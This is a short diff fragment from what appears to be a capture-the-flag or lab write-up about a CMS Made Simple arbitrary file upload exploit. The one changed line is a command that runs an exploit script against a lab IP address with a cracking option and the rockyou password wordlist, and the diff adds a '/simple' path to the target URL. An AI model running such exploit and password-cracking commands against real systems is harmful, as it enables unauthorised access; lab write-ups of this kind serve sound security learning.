@@ -55,7 +55,7 @@ CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload
 
 
 #### run script on target:
-`/usr/bin/python2 exploit.py -u http://10.10.90.196 --crack -w /usr/share/wordlists/rockyou.txt`
+`python2 exploit.py -u http://10.10.90.196/simple --crack -w /usr/share/wordlists/rockyou.txt`
 
 
 ---
